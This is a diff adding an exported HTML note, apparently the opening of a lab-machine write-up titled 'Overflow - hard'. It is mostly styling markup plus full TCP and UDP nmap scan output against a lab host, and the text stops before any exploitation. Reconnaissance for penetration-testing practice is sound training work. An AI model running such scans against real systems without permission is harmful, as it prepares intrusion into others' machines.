@@ -1,0 +1,2162 @@
+
+				<!DOCTYPE html>
+				<html>
+					<head>
+						<meta charset="UTF-8">
+						<meta name="viewport" content="width=device-width, initial-scale=1" />
+						<link rel="stylesheet" href="pluginAssets/katex/katex.css"><script type="application/javascript" src="pluginAssets/mermaid/mermaid.min.js"></script><script type="application/javascript" src="pluginAssets/mermaid/mermaid_render.js"></script><link rel="stylesheet" href="pluginAssets/highlight.js/atom-one-light.css">
+						<title>Overflow - hard - Complete 11/17/2021</title>
+					</head>
+					<body>
+						<div class="exported-note"><div class="exported-note-title">Overflow - hard - Complete 11/17/2021</div>
+
+<style>
+		/* https://necolas.github.io/normalize.css/ */
+		html{line-height:1.15;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}
+		article,aside,footer,header,nav,section{display:block}h1{font-size:2em;margin:.67em 0}hr{box-sizing:content-box;height:0;overflow:visible}
+		pre{font-family:monospace,monospace;font-size:1em}a{background-color:transparent;-webkit-text-decoration-skip:objects}
+		b,strong{font-weight:bolder}small{font-size:80%}img{border-style:none}
+
+		body {
+			font-size: 15px;
+			color: #32373F;
+			word-wrap: break-word;
+			line-height: 1.6em;
+			background-color: #ffffff;
+			font-family: 'Avenir', 'Arial', sans-serif;
+			padding-bottom: 0px;
+			padding-top: 0px;
+		}
+		strong {
+			color: #000000;
+		}
+		kbd {
+			border: 1px solid rgb(220, 220, 220);
+			box-shadow: inset 0 -1px 0 rgb(220, 220, 220);
+			padding: 2px 4px;
+			border-radius: 3px;
+			background-color: rgb(243, 243, 243);
+		}
+		::-webkit-scrollbar {
+			width: 7px;
+			height: 7px;
+		}
+		::-webkit-scrollbar-corner {
+			background: none;
+		}
+		::-webkit-scrollbar-track {
+			border: none;
+		}
+		::-webkit-scrollbar-thumb {
+			background: rgba(100, 100, 100, 0.3); 
+			border-radius: 5px;
+		}
+		::-webkit-scrollbar-track:hover {
+			background: rgba(0, 0, 0, 0.1); 
+		}
+		::-webkit-scrollbar-thumb:hover {
+			background: rgba(100, 100, 100, 0.7); 
+		}
+
+		
+
+		/* Remove top padding and margin from first child so that top of rendered text is aligned to top of text editor text */
+
+		#rendered-md > h1:first-child,
+		#rendered-md > h2:first-child,
+		#rendered-md > h3:first-child,
+		#rendered-md > h4:first-child,
+		#rendered-md > ul:first-child,
+		#rendered-md > ol:first-child,
+		#rendered-md > table:first-child,
+		#rendered-md > blockquote:first-child,
+		#rendered-md > img:first-child,
+		#rendered-md > p:first-child {
+			margin-top: 0;
+			padding-top: 0;
+		}
+		
+		p, h1, h2, h3, h4, h5, h6, ul, table {
+			margin-top: .6em;
+			margin-bottom: 1.35em;
+
+			/*
+				Adds support for RTL text in the note body. It automatically detects the direction using the content.
+				Issue: https://github.com/laurent22/joplin/issues/3991
+			*/
+			unicode-bidi: plaintext;
+		}
+
+		h1, h2, h3, h4, h5, h6, ul, table {
+			margin-bottom: 0.65em;
+		}
+
+		h1, h2, h3, h4, h5, h6 {
+			line-height: 1.5em;
+		}
+		h1 {
+			font-size: 1.5em;
+			font-weight: bold;
+			border-bottom: 1px solid #dddddd;
+			padding-bottom: .3em;
+		}
+		h2 {
+			font-size: 1.3em;
+			font-weight: bold;
+			padding-bottom: .1em; */
+		}
+		h3 {
+			font-size: 1.1em;
+		}
+		h4, h5, h6 {
+			font-size: 1em;
+			font-weight: bold;
+		}
+
+		.exported-note-title {
+			font-size: 2em;
+			font-weight: bold;
+			margin-bottom: 0.8em;
+			line-height: 1.5em;
+			padding-bottom: .35em;
+			border-bottom: 1px solid #dddddd;
+		}
+
+		a {
+			color: #155BDA;
+		}
+		ul, ol {
+			padding-left: 0;
+			margin-left: 1.7em;
+		}
+		li {
+			margin-bottom: .4em;
+		}
+		li p {
+			margin-top: 0.2em;
+			margin-bottom: 0;
+		}
+
+		.resource-icon {
+			display: inline-block;
+			position: relative;
+			top: 0.3em;
+			text-decoration: none;
+			width: 1.2em;
+			height: 1.4em;
+			margin-right: 0.4em;
+			background-color:  #155BDA;
+		}
+    /* These icons are obtained from the wonderful ForkAwesome project by copying the src svgs 
+     * into the css classes below.
+     * svgs are obtained from https://github.com/ForkAwesome/Fork-Awesome/tree/master/src/icons/svg
+     * instead of the svg width, height property you must use a viewbox here, 0 0 1536 1792 is typically the actual size of the icon
+     * each line begins with the pre-amble -webkit-mask: url("data:image/svg+xml;utf8,
+     * and of course finishes with ");
+     * to precvent artifacts it is also necessary to include -webkit-mask-repeat: no-repeat;
+     * on the following line
+     * */
+		.fa-joplin {
+			/* Awesome Font file */
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M373.834 128C168.227 128 0 296.223 0 501.834v788.336C0 1495.778 168.227 1664 373.834 1664h788.336c205.608 0 373.83-168.222 373.83-373.83V501.834C1536 296.224 1367.778 128 1162.17 128zm397.222 205.431h417.424a7.132 7.132 0 0 1 7.132 7.133v132.552c0 4.461-3.619 8.073-8.077 8.073h-57.23c-24.168 0-43.768 19.338-44.284 43.374v2.377h-.017v136.191h-.053l-.466 509.375c-5.02 77.667-39.222 149.056-96.324 201.046-60.28 54.834-141.948 85.017-229.962 85.017-12.45 0-25.208-.61-37.907-1.785-92.157-8.682-181.494-48.601-251.662-112.438-71.99-65.517-117.147-150.03-127.164-238-11.226-98.763 23.42-192.783 95.045-257.937 81.99-74.637 198.185-101.768 316.613-75.704 5.574 1.227 9.55 6.282 9.55 11.997v199.52c-.199 2.625-1.481 6.599-8.183 2.896-.663-.365-1.194-.511-1.653-.531-21.987-10.587-45.159-17.57-68.559-19.916-.38-.04-.757-.124-1.138-.163-.537-.048-1.034-.033-1.556-.075-4.13-.354-8.183-.517-12.203-.58-.87-.011-1.771-.127-2.641-.127-.486 0-.951.05-1.437.057-1.464.011-2.886.115-4.33.163-2.76.102-5.497.211-8.182.448-.273.024-.547.07-.835.097-25.509 2.4-47.864 11.104-65.012 25.47-.954.802-1.974 1.53-2.9 2.36a1.34 1.34 0 0 1-.168.146c-23.96 21.8-34.881 53.872-30.726 90.316 4.62 40.737 26.94 81.156 62.841 113.823 35.908 32.67 80.335 52.977 125.113 57.186 35.118 3.36 66.547-3.919 89.899-20.461a97.255 97.255 0 0 0 9.365-7.501c2.925-2.661 5.569-5.5 8.086-8.416.3-.348.672-.673.975-1.024 8.253-9.864 14.222-21.067 17.996-33.148.639-2.034 1.051-4.148 1.564-6.227.381-1.563.81-3.106 1.112-4.693.555-2.784.923-5.632 1.253-8.49.086-.709.183-1.414.237-2.128.492-4.893.693-9.858.55-14.91h.013V521.623c-2.01-22.626-20.78-40.434-43.928-40.434h-57.23a8.071 8.071 0 0 1-8.077-8.073V340.564a7.132 7.132 0 0 1 7.136-7.133z'/></svg>");
+		}
+		.fa-file-image {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-128-448v320H256v-192l192-192 128 128 384-384zm-832-192c-106 0-192-86-192-192s86-192 192-192 192 86 192 192-86 192-192 192z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-pdf {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-514-593c25 20 53 38 84 56 42-5 81-7 117-7 67 0 152 8 177 49 7 10 13 28 2 52-1 1-2 3-3 4v1c-3 18-18 38-71 38-64 0-161-29-245-73-139 15-285 46-392 83-103 176-182 262-242 262-10 0-19-2-28-7l-24-12c-3-1-4-3-6-5-5-5-9-16-6-36 10-46 64-123 188-188 8-5 18-2 23 6 1 1 2 3 2 4 31-51 67-116 107-197 45-90 80-178 104-262-32-109-42-221-24-287 7-25 22-40 42-40h22c15 0 27 5 35 15 12 14 15 36 9 68-1 3-2 6-4 8 1 3 1 5 1 8v30c-1 63-2 123-14 192 35 105 87 190 146 238zm-576 411c30-14 73-57 137-158-75 58-122 124-137 158zm398-920c-10 28-10 76-2 132 3-16 5-31 7-44 2-17 5-31 7-43 1-3 2-5 4-8-1-1-1-3-2-5-1-18-7-29-13-36 0 2-1 3-1 4zm-124 661c88-35 186-63 284-81-10-8-20-15-29-23-49-43-93-103-127-176-19 61-47 126-83 197-15 28-30 56-45 83zm646-16c-5-5-31-24-140-24 49 18 94 28 124 28 9 0 14 0 18-1 0-1-1-2-2-3z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-word {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM233 768v107h70l164 661h159l128-485c5-15 8-30 10-46 1-8 2-16 2-24h4l3 24c3 14 4 30 9 46l128 485h159l164-661h70V768h-300v107h90l-99 438c-4 16-6 33-7 46l-2 21h-4c0-6-2-14-3-21-3-13-5-30-9-46L825 768H711l-144 545c-4 16-5 33-8 46l-4 21h-4l-2-21c-1-13-3-30-7-46l-99-438h90V768H233z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-powerpoint {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-992-234v106h327v-106h-93v-167h137c43 0 82-2 118-15 90-31 146-124 146-233s-54-193-137-228c-38-15-84-19-130-19H416v107h92v555h-92zm353-280H650V882h120c35 0 62 6 83 18 36 21 56 62 56 115 0 56-20 99-62 120-21 10-47 15-78 15z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-excel {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-979-234v106h281v-106h-75l103-161c12-19 18-34 21-34h2c1 4 3 7 5 10 4 8 10 14 17 24l107 161h-76v106h291v-106h-68l-192-273 195-282h67V768H828v107h74l-103 159c-12 19-21 34-21 33h-2c-1-4-3-7-5-10-4-7-9-14-17-23L648 875h76V768H434v107h68l189 272-194 283h-68z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-audio {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM620 850c12 5 20 17 20 30v544c0 13-8 25-20 30-4 1-8 2-12 2-8 0-16-3-23-9l-166-167H288c-18 0-32-14-32-32v-192c0-18 14-32 32-32h131l166-167c10-9 23-12 35-7zm417 689c19 0 37-8 50-24 83-102 129-231 129-363s-46-261-129-363c-22-28-63-32-90-10-28 23-32 63-9 91 65 80 100 178 100 282s-35 202-100 282c-23 28-19 68 9 90 12 10 26 15 40 15zm-211-148c17 0 34-7 47-20 56-60 87-137 87-219s-31-159-87-219c-24-26-65-27-91-3-25 24-27 65-2 91 33 36 52 82 52 131s-19 95-52 131c-25 26-23 67 2 91 13 11 29 17 44 17z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-video {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM768 768c70 0 128 58 128 128v384c0 70-58 128-128 128H384c-70 0-128-58-128-128V896c0-70 58-128 128-128h384zm492 2c12 5 20 17 20 30v576c0 13-8 25-20 30-4 1-8 2-12 2-8 0-17-3-23-9l-265-266v-90l265-266c6-6 15-9 23-9 4 0 8 1 12 2z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-archive {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M640 384V256H512v128h128zm128 128V384H640v128h128zM640 640V512H512v128h128zm128 128V640H640v128h128zm700-388c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H768v128H640V128H128v1536h1280zM781 943c85 287 107 349 107 349 5 17 8 34 8 52 0 111-108 192-256 192s-256-81-256-192c0-18 3-35 8-52 0 0 21-62 120-396V768h128v128h79c29 0 54 19 62 47zm-141 465c71 0 128-29 128-64s-57-64-128-64-128 29-128 64 57 64 128 64z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-code {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM480 768c11-14 31-17 45-6l51 38c14 11 17 31 6 45l-182 243 182 243c11 14 8 34-6 45l-51 38c-14 11-34 8-45-6l-226-301c-8-11-8-27 0-38zm802 301c8 11 8 27 0 38l-226 301c-11 14-31 17-45 6l-51-38c-14-11-17-31-6-45l182-243-182-243c-11-14-8-34 6-45l51-38c14-11 34-8 45 6zm-620 461c-18-3-29-20-26-37l138-831c3-18 20-29 37-26l63 10c18 3 29 20 26 37l-138 831c-3 18-20 29-37 26z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-alt, .fa-file-csv {
+      /* fork-awesome doesn't have csv so we use the text icon */
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM384 800c0-18 14-32 32-32h704c18 0 32 14 32 32v64c0 18-14 32-32 32H416c-18 0-32-14-32-32v-64zm736 224c18 0 32 14 32 32v64c0 18-14 32-32 32H416c-18 0-32-14-32-32v-64c0-18 14-32 32-32h704zm0 256c18 0 32 14 32 32v64c0 18-14 32-32 32H416c-18 0-32-14-32-32v-64c0-18 14-32 32-32h704z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		blockquote {
+			border-left: 4px solid rgb(220, 220, 220);
+			padding-left: 1.2em;
+			margin-left: 0;
+			opacity: 0.7;
+		}
+
+		.jop-tinymce table,
+		table {
+			text-align: left;
+			border-collapse: collapse;
+			border: 1px solid rgb(220, 220, 220);
+			background-color: #ffffff;
+		}
+
+		.jop-tinymce table td, .jop-tinymce table th,
+		table td, th {
+			text-align: left;
+			padding: .5em 1em .5em 1em;
+			font-size: 15;
+			color: #32373F;
+			font-family: 'Avenir', 'Arial', sans-serif;
+		}
+
+		.jop-tinymce table td,
+		table td {
+			border: 1px solid rgb(220, 220, 220);
+		}
+
+		.jop-tinymce table th,
+		table th {
+			border: 1px solid rgb(220, 220, 220);
+			border-bottom: 2px solid rgb(220, 220, 220);
+			background-color: rgb(247, 247, 247);
+		}
+
+		.jop-tinymce table tr:nth-child(even),
+		table tr:nth-child(even) {
+			background-color: rgb(247, 247, 247);
+		}
+
+		.jop-tinymce table tr:hover,
+		table tr:hover {
+			background-color: #e5e5e5;
+		}
+
+		hr {
+			border: none;
+			border-bottom: 2px solid #dddddd;
+		}
+		img {
+			max-width: 100%;
+			height: auto;
+		}
+		
+		.inline-code,
+		.mce-content-body code {
+			border: 1px solid rgb(220, 220, 220);
+			background-color: rgb(243, 243, 243);
+			padding-right: .2em;
+			padding-left: .2em;
+			border-radius: .25em;
+			color: rgb(0,0,0);
+			font-size: .9em;
+		}
+
+		.highlighted-keyword {
+			background-color: #F3B717;
+			color: black;
+		}
+
+		.not-loaded-resource img {
+			width: 1.15em;
+			height: 1.15em;
+			background: white;
+			padding: 2px !important;
+			border-radius: 2px;
+			box-shadow: 0 1px 3px #000000aa;
+		}
+
+		a.not-loaded-resource img {
+			margin-right: .2em;
+		}
+
+		a.not-loaded-resource {
+			display: flex;
+			flex-direction: row;
+			align-items: center;
+		}
+
+		.md-checkbox input[type=checkbox]:checked {
+			opacity: 0.7;
+		}
+
+		.jop-tinymce ul.joplin-checklist .checked,
+		.md-checkbox .checkbox-label-checked {
+			opacity: 0.5;
+		}
+
+		.exported-note {
+			padding: 1em;
+		}
+
+		.joplin-editable .joplin-source {
+			display: none;
+		}
+
+		mark {
+			background: #F7D26E;
+			color: black;
+		}
+
+		/* =============================================== */
+		/* For TinyMCE */
+		/* =============================================== */
+
+		.mce-content-body {
+			/* Note: we give a bit more padding at the bottom, to allow scrolling past the end of the document */
+			padding: 5px 10px 10em 0;
+		}
+
+		/*
+		.mce-content-body code {
+			background-color: transparent;
+		}
+		*/
+
+		.mce-content-body [data-mce-selected=inline-boundary] {
+			background-color: transparent;
+		}
+
+		.mce-content-body .joplin-editable {
+			cursor: pointer !important;
+		}
+
+		.mce-content-body.mce-content-readonly {
+			opacity: 0.5;
+		}
+
+		/* We need that to make sure click events have the A has a target */
+		.katex a span {
+			pointer-events: none;
+		}
+
+		.media-player {
+			width: 100%;
+			margin-top: 10px;
+		}
+
+		.media-player.media-pdf {
+			min-height: 100vh;
+		}
+
+		/* Clear the CODE style if the element is within a joplin-editable block */
+		.mce-content-body .joplin-editable code {
+			border: none;
+			background: none;
+			padding: 0;
+			color: inherit;
+			font-size: inherit;
+		}
+
+		/* =============================================== */
+		/* For TinyMCE */
+		/* =============================================== */
+
+		@media print {
+			body {
+				height: auto !important;
+			}
+
+			pre {
+				white-space: pre-wrap;
+			}
+
+			.code, .inline-code {
+				border: 1px solid #CBCBCB;
+			}
+
+			#joplin-container-content {
+				/* The height of the content is set dynamically by JavaScript (in updateBodyHeight) to go
+				   around various issues related to scrolling. However when printing we don't want this
+				   fixed size as that would crop the content. So we set it to auto here. "important" is
+				   needed to override the style set by JavaScript at the element-level. */
+				height: auto !important;
+			}
+		}
+	
+
+				/*
+					FOR THE MARKDOWN EDITOR
+				*/
+
+				/* Remove the indentation from the checkboxes at the root of the document
+				   (otherwise they are too far right), but keep it for their children to allow
+				   nested lists. Make sure this value matches the UL margin. */
+
+				li.md-checkbox {
+					list-style-type: none;
+				}
+
+				li.md-checkbox input[type=checkbox] {
+					margin-left: -1.71em;
+					margin-right: 0.7em;
+				}
+				
+				ul.joplin-checklist {
+					list-style:none;
+				}
+
+				/*
+					FOR THE RICH TEXT EDITOR
+				*/
+
+				ul.joplin-checklist li::before {
+					content:"\f14a";
+					font-family:"Font Awesome 5 Free";
+					background-size: 16px 16px;
+					pointer-events: all;
+					cursor: pointer;
+					width: 1em;
+					height: 1em;
+					margin-left: -1.3em;
+					position: absolute;
+					color: #32373F;
+				}
+
+				.joplin-checklist li:not(.checked)::before {
+					content:"\f0c8";
+				}
+.mermaid { background-color: white; width: 640px; }</style><div id="rendered-md"><h1 id="overflow-hard">overflow - hard</h1>
+<h3 id="nmap">nmap</h3>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">$ nmap -p- -A -oA overflow overflow                                                                                            
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-10 08:17 EST
+Nmap scan report for overflow (10.129.253.14)
+Host is up (0.049s latency).
+Not shown: 65532 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 eb:7c:15:8f:f2:cc:d4:26:54:c1:e1:57:0d:d5:b6:7c (RSA)
+|   256 d9:5d:22:85:03:de:ad:a0:df:b0:c3:00:aa:87:e8:9c (ECDSA)
+|_  256 fa:ec:32:f9:47:17:60:7e:e0:ba:b6:d1:77:fb:07:7b (ED25519)
+25/tcp open  smtp    Postfix smtpd
+|_smtp-commands: overflow, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Overflow Sec
+Service Info: Host:  overflow; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 88.63 seconds</pre><pre class="hljs"><code><span class="hljs-variable">$ </span>nmap -p- -A -oA overflow overflow                                                                                            
+Starting Nmap <span class="hljs-number">7.91</span> ( <span class="hljs-symbol">https:</span>//nmap.org ) at <span class="hljs-number">2021</span><span class="hljs-number">-11</span><span class="hljs-number">-10</span> <span class="hljs-number">08</span><span class="hljs-symbol">:</span><span class="hljs-number">17</span> EST
+Nmap scan report <span class="hljs-keyword">for</span> overflow (<span class="hljs-number">10.129</span>.<span class="hljs-number">253.14</span>)
+Host is up (<span class="hljs-number">0.049</span>s latency).
+Not <span class="hljs-symbol">shown:</span> <span class="hljs-number">65532</span> closed ports
+PORT   STATE SERVICE VERSION
+<span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">7.6</span>p1 Ubuntu <span class="hljs-number">4</span>ubuntu0.<span class="hljs-number">5</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)
+| ssh-<span class="hljs-symbol">hostkey:</span> 
+|   <span class="hljs-number">2048</span> <span class="hljs-symbol">eb:</span><span class="hljs-number">7</span><span class="hljs-symbol">c:</span><span class="hljs-number">15</span><span class="hljs-symbol">:</span><span class="hljs-number">8</span><span class="hljs-symbol">f:</span><span class="hljs-symbol">f2:</span><span class="hljs-symbol">cc:</span><span class="hljs-symbol">d4:</span><span class="hljs-number">26</span><span class="hljs-symbol">:</span><span class="hljs-number">54</span><span class="hljs-symbol">:c1</span><span class="hljs-symbol">:e1</span><span class="hljs-symbol">:</span><span class="hljs-number">57</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">d:</span><span class="hljs-symbol">d5:</span><span class="hljs-symbol">b6:</span><span class="hljs-number">7</span>c (RSA)
+|   <span class="hljs-number">256</span> <span class="hljs-symbol">d9:</span><span class="hljs-number">5</span><span class="hljs-symbol">d:</span><span class="hljs-number">22</span><span class="hljs-symbol">:</span><span class="hljs-number">85</span><span class="hljs-symbol">:</span><span class="hljs-number">03</span><span class="hljs-symbol">:de</span><span class="hljs-symbol">:ad</span><span class="hljs-symbol">:a0</span><span class="hljs-symbol">:df</span><span class="hljs-symbol">:b0</span><span class="hljs-symbol">:c3</span><span class="hljs-symbol">:</span><span class="hljs-number">00</span><span class="hljs-symbol">:aa</span><span class="hljs-symbol">:</span><span class="hljs-number">87</span><span class="hljs-symbol">:e8</span><span class="hljs-symbol">:</span><span class="hljs-number">9</span>c (ECDSA)
+|_  <span class="hljs-number">256</span> <span class="hljs-symbol">fa:</span><span class="hljs-symbol">ec:</span><span class="hljs-number">32</span><span class="hljs-symbol">:f9</span><span class="hljs-symbol">:</span><span class="hljs-number">47</span><span class="hljs-symbol">:</span><span class="hljs-number">17</span><span class="hljs-symbol">:</span><span class="hljs-number">60</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">e:</span><span class="hljs-symbol">e0:</span><span class="hljs-symbol">ba:</span><span class="hljs-symbol">b6:</span><span class="hljs-symbol">d1:</span><span class="hljs-number">77</span><span class="hljs-symbol">:fb</span><span class="hljs-symbol">:</span><span class="hljs-number">07</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span>b (ED25519)
+<span class="hljs-number">25</span>/tcp open  smtp    Postfix smtpd
+|_smtp-<span class="hljs-symbol">commands:</span> overflow, PIPELINING, SIZE <span class="hljs-number">10240000</span>, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, <span class="hljs-number">8</span>BITMIME, DSN, SMTPUTF8, 
+<span class="hljs-number">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2.4</span>.<span class="hljs-number">29</span> ((Ubuntu))
+|_http-server-<span class="hljs-symbol">header:</span> Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">29</span> (Ubuntu)
+|_http-<span class="hljs-symbol">title:</span> Overflow Sec
+Service <span class="hljs-symbol">Info:</span> <span class="hljs-symbol">Host:</span>  overflow; <span class="hljs-symbol">OS:</span> Linux; <span class="hljs-symbol">CPE:</span> <span class="hljs-symbol">cpe:</span>/<span class="hljs-symbol">o:</span><span class="hljs-symbol">linux:</span>linux_kernel
+
+Service detection performed. Please report any incorrect results at <span class="hljs-symbol">https:</span>//nmap.org/submit/ .
+Nmap <span class="hljs-symbol">done:</span> <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">88.63</span> seconds</code></pre></div>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">$ sudo nmap -sU overflow -oA overflow_udp                                 [21-11-10 18:35:30]
+[sudo] password for kali: 
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-10 18:35 EST
+Stats: 0:14:52 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
+UDP Scan Timing: About 85.04% done; ETC: 18:53 (0:02:37 remaining)
+Nmap scan report for overflow (10.129.253.67)
+Host is up (0.052s latency).
+Not shown: 999 closed ports
+PORT   STATE         SERVICE
+68/udp open|filtered dhcpc
+
+Nmap done: 1 IP address (1 host up) scanned in 1088.49 seconds
+</pre><pre class="hljs"><code><span class="hljs-string">$</span> <span class="hljs-string">sudo</span> <span class="hljs-string">nmap</span> <span class="hljs-string">-sU</span> <span class="hljs-string">overflow</span> <span class="hljs-string">-oA</span> <span class="hljs-string">overflow_udp</span>                                 [<span class="hljs-number">21</span><span class="hljs-number">-11</span><span class="hljs-number">-10</span> <span class="hljs-number">18</span><span class="hljs-string">:35:30</span>]
+[<span class="hljs-string">sudo</span>] <span class="hljs-attr">password for kali:</span> 
+<span class="hljs-string">Starting</span> <span class="hljs-string">Nmap</span> <span class="hljs-number">7.91</span> <span class="hljs-string">(</span> <span class="hljs-string">https://nmap.org</span> <span class="hljs-string">)</span> <span class="hljs-string">at</span> <span class="hljs-number">2021-11-10 </span><span class="hljs-number">18</span><span class="hljs-string">:35</span> <span class="hljs-string">EST</span>
+<span class="hljs-attr">Stats:</span> <span class="hljs-number">0</span><span class="hljs-string">:14:52</span> <span class="hljs-string">elapsed;</span> <span class="hljs-number">0</span> <span class="hljs-string">hosts</span> <span class="hljs-string">completed</span> <span class="hljs-string">(1</span> <span class="hljs-string">up),</span> <span class="hljs-number">1</span> <span class="hljs-string">undergoing</span> <span class="hljs-string">UDP</span> <span class="hljs-string">Scan</span>
